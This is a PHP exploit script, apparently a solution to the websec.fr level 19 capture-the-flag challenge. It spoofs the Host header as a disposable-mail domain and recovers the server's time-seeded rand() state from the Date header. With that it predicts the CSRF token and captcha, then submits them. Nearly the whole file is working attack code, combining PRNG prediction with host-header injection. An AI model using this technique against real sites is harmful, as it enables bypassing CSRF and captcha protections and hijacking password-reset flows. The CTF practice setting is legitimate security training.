<?php 

function generate_random_text($length)
{
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for ($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

$HOST = "sharklasers.com";

$COOKIE_JAR = tempnam('/tmp', 'level19-cookie-jar');
echo "Saving cookies to " . $COOKIE_JAR . PHP_EOL;

$ch = curl_init('http://websec.fr/level19/index.php');
curl_setopt($ch, CURLOPT_COOKIEJAR, $COOKIE_JAR);
curl_setopt($ch, CURLOPT_COOKIEFILE, $COOKIE_JAR);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Host: $HOST"));
// curl_setopt($ch, CURLOPT_VERBOSE, 1);

$page = curl_exec($ch);
curl_close($ch);

echo $page;
preg_match_all('/^Date: (.+)$/im', $page, $matches);

$time = trim($matches[1][0]);
echo 'Date: ' . $time . PHP_EOL;
$time = strtotime($time);
echo 'UNIX Timestamp: ' . $time . PHP_EOL;

srand($time);
$csrf_token = generate_random_text(32);
echo  'CSRF Token: ' . $csrf_token . PHP_EOL;

if (strpos($page, $csrf_token) !== FALSE) {
    $captcha = generate_random_text(255 / 10.0);
    echo "Predicted CSRF matches!" . PHP_EOL;
} else {
    die('Can\'t fing CSRF token in response. Try again!');
}

echo "Captcha: " . $captcha . PHP_EOL;

$ch = curl_init('http://websec.fr/level19/index.php');
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_COOKIEJAR, $COOKIE_JAR);
curl_setopt($ch, CURLOPT_COOKIEFILE, $COOKIE_JAR);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "captcha=$captcha&token=$csrf_token");
curl_setopt($ch, CURLOPT_HTTPHEADER, array("Host: $HOST"));
// curl_setopt($ch, CURLOPT_VERBOSE, 1);
$page = curl_exec($ch);
curl_close($ch);

echo $page . PHP_EOL;

?>